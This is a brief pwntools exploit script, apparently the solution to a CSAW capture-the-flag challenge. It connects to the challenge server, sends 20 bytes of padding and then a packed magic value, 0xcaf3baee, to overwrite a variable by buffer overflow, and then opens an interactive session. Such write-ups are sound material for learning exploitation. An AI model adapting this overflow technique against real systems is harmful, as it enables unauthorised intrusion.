from pwn import *
context(arch='amd64', os='linux')

r = remote('pwn.chal.csaw.io', 9000)

r.send('a'*20)
r.send(p32(0xcaf3baee))
r.interactive()